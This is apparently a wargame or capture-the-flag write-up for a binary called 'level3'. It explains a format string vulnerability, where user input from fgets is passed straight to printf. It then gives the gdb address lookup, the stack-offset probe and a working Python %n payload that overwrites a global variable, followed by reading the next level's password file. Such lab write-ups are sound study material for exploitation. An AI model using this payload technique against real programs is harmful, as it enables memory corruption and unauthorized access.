After running the program, we observed that it reads from stdin.

We found a global variable called `m` initialized to `0` and a function named `v()`.

The program calls four C functions (`fgets`, `printf`, `fwrite`, `system`) and compares the value of the `m` variable to `0x40` (64).

Since the program uses `fgets` to read from stdin, it is protected from buffer overflow. However, it passes the returned value to the printf function.

According to the manual page of printf, the bugs section states:
```
Code such as printf(foo); often indicates a bug, since foo may contain a % character. If foo comes from untrusted user input, it may contain %n, causing the printf() call to write to memory and creating a security hole.
```
We will exploit the program using a "Format String Vulnerability Exploitation" approach. For more information, refer to:
- https://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html

First, we need to extract the address of the `m` variable:
```
(gdb) info var
Non-debugging symbols:
[...]
0x0804988c  m
```
Next, we need to determine the offset:
```
./level3
AAAA %p %p %p %p %p
AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520
```
The offset is 4. Now we construct the payload for exploitation:
```
$ python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"' > /tmp/payload
$ cat /tmp/payload - | ./level3
$ cat /home/user/level4/.pass
```
